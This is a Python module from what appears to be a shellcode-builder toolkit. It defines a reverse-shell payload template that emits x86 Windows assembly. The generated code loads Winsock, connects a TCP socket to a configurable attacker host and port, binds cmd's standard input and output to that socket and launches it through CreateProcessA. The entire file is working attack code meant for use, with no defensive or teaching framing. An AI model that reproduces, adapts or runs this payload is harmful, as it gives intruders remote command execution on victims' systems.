"""Reverse shell payload template.

Requires: LoadLibraryA, WSAStartup, WSASocketA, connect, CreateProcessA
Variables: socket_handle
Strings: cmd (mov method, pre-built at slot)
"""
from __future__ import annotations

import socket
import struct

from .base import PayloadTemplate, TemplateConfig


class ReverseShellTemplate(PayloadTemplate):
    REQUIRED_FUNCTIONS = (
        "LoadLibraryA",
        "WSAStartup",
        "WSASocketA",
        "connect",
        "CreateProcessA",
    )
    REQUIRED_VARIABLES = ("socket_handle",)

    def emit(self, layout, config: TemplateConfig) -> str:
        ip_be = struct.unpack(">I", socket.inet_aton(config.lhost))[0]
        port_be = socket.htons(config.lport)

        wsa_start = layout.slot("WSAStartup").ebp_ref
        wsa_sock  = layout.slot("WSASocketA").ebp_ref
        conn      = layout.slot("connect").ebp_ref
        cpa       = layout.slot("CreateProcessA").ebp_ref
        sock_h    = layout.slot("socket_handle").ebp_ref
        wsadata   = layout.slot("WSADATA").ebp_ref
        sockaddr  = layout.slot("sockaddr_in").ebp_ref
        si        = layout.slot("STARTUPINFOA").ebp_ref
        pi        = layout.slot("PROCESS_INFORMATION").ebp_ref
        cmd       = layout.slot("cmd").ebp_ref

        return "\n".join([
            "; ── Reverse Shell Payload ─────────────────────────────────────────",
            f"; Target: {config.lhost}:{config.lport}",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            f"    lea  esi, {wsadata}",
            "    push esi                    ; lpWSAData",
            "    push 0x0202                 ; wVersionRequested = MAKEWORD(2,2)",
            f"    call dword ptr {wsa_start}",
            "",
            "    ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; dwFlags = NULL",
            "    push eax                    ; g = NULL",
            "    push eax                    ; lpProtocolInfo = NULL",
            "    mov  al, 0x6",
            "    push eax                    ; protocol = IPPROTO_TCP",
            "    sub  al, 0x5",
            "    push eax                    ; type = SOCK_STREAM",
            "    inc  eax",
            "    push eax                    ; af = AF_INET",
            f"    call dword ptr {wsa_sock}",
            f"    mov  {sock_h}, eax         ; save SOCKET handle",
            "",
            "    ; Set STARTUPINFOA stdio handles to socket",
            f"    mov  eax, {sock_h}",
            f"    lea  edi, {si}",
            "    mov  [edi+0x38], eax        ; hStdInput",
            "    mov  [edi+0x3c], eax        ; hStdOutput",
            "    mov  [edi+0x40], eax        ; hStdError",
            "",
            "    ; Set sockaddr_in address and port",
            f"    lea  edi, {sockaddr}",
            f"    mov  word ptr [edi+0x02], 0x{port_be:04x}     ; sin_port (big-endian)",
            f"    mov  dword ptr [edi+0x04], 0x{ip_be:08x}  ; sin_addr (big-endian)",
            "",
            "    ; connect(socket, &sockaddr_in, 0x10)",
            f"    lea  eax, {sockaddr}",
            "    push 0x10                   ; namelen",
            "    push eax                    ; name = &sockaddr_in",
            f"    push dword ptr {sock_h}    ; socket handle",
            f"    call dword ptr {conn}",
            "",
            "    ; CreateProcessA(NULL, &cmd, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)",
            f"    lea  esi, {cmd}",
            f"    lea  edi, {si}",
            f"    lea  ebx, {pi}",
            "    xor  eax, eax",
            "    push ebx                    ; lpProcessInformation",
            "    push edi                    ; lpStartupInfo",
            "    push eax                    ; lpCurrentDirectory = NULL",
            "    push eax                    ; lpEnvironment = NULL",
            "    push eax                    ; dwCreationFlags = NULL",
            "    inc  eax",
            "    push eax                    ; bInheritHandles = TRUE",
            "    xor  eax, eax",
            "    push eax                    ; lpThreadAttributes = NULL",
            "    push eax                    ; lpProcessAttributes = NULL",
            "    push esi                    ; lpCommandLine = &cmd",
            "    push eax                    ; lpApplicationName = NULL",
            f"    call dword ptr {cpa}",
            "",
        ])
